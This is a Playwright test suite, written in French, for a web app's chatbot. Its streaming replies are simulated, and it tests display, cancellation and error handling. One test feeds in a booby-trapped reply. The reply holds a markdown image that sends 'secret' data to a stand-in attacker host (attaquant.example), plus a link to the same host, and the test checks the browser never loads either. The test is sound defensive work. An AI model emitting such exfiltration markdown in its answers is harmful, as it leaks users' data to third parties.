import { expect, test } from "@playwright/test";
import { login } from "./helpers";

const sseBody = (...deltas: string[]) =>
  deltas.map((d) => `event:message\ndata:${d}\n\n`).join("") + "event:done\ndata:\n\n";

test.describe("Chatbot (reponses simulees : aucun appel a OpenAI)", () => {
  test("la reponse s'affiche au fil de l'eau", async ({ page }) => {
    await page.route("**/chat/ask/stream", (route) =>
      route.fulfill({
        status: 200,
        contentType: "text/event-stream",
        body: sseBody("Le délai d'opposition ", "est de **15 jours**."),
      }));
    await login(page);

    await page.getByRole("button", { name: "Ouvrir le chatbot" }).click();
    await page.getByPlaceholder("Posez votre question...").fill("Quel est le délai d'opposition ?");
    await page.getByRole("button", { name: "Envoyer" }).click();

    await expect(page.getByText("est de")).toBeVisible();
    await expect(page.locator("strong", { hasText: "15 jours" })).toBeVisible();
    await expect(page.getByPlaceholder("Posez votre question...")).toBeEnabled();
  });

  test("une reponse piegee (image d'exfiltration) n'est jamais chargee par le navigateur", async ({ page }) => {
    const requetesExternes: string[] = [];
    page.on("request", (req) => {
      if (req.url().includes("attaquant.example")) requetesExternes.push(req.url());
    });
    await page.route("**/chat/ask/stream", (route) =>
      route.fulfill({
        status: 200,
        contentType: "text/event-stream",
        body: sseBody("Solde : 100 DH ![](https://attaquant.example/collect?d=secret) ", "[cliquez](https://attaquant.example/x)"),
      }));
    await login(page);

    await page.getByRole("button", { name: "Ouvrir le chatbot" }).click();
    await page.getByPlaceholder("Posez votre question...").fill("Solde ?");
    await page.getByRole("button", { name: "Envoyer" }).click();

    await expect(page.getByText(/Solde : 100 DH/)).toBeVisible();
    await expect(page.locator("img[src*='attaquant']")).toHaveCount(0);
    await expect(page.locator("a[href*='attaquant']")).toHaveCount(0);
    expect(requetesExternes).toEqual([]);
  });

  test("un service qui ne repond pas ne fige pas l'interface : on peut annuler", async ({ page }) => {
    await page.route("**/chat/ask/stream", () => { /* jamais de reponse */ });
    await login(page);

    await page.getByRole("button", { name: "Ouvrir le chatbot" }).click();
    await page.getByPlaceholder("Posez votre question...").fill("Question sans reponse");
    await page.getByRole("button", { name: "Envoyer" }).click();
    await expect(page.getByPlaceholder("Posez votre question...")).toBeDisabled();

    await page.getByRole("button", { name: "Annuler la requête" }).click();

    await expect(page.getByText(/Réponse annulée/)).toBeVisible();
    await expect(page.getByPlaceholder("Posez votre question...")).toBeEnabled();
  });

  test("une erreur du service est expliquee sans bloquer la saisie", async ({ page }) => {
    await page.route("**/chat/ask/stream", (route) => route.fulfill({ status: 502, body: "{}" }));
    await login(page);

    await page.getByRole("button", { name: "Ouvrir le chatbot" }).click();
    await page.getByPlaceholder("Posez votre question...").fill("Bonjour");
    await page.getByRole("button", { name: "Envoyer" }).click();

    await expect(page.getByText(/momentanément indisponible/)).toBeVisible();
    await expect(page.getByPlaceholder("Posez votre question...")).toBeEnabled();
  });
});
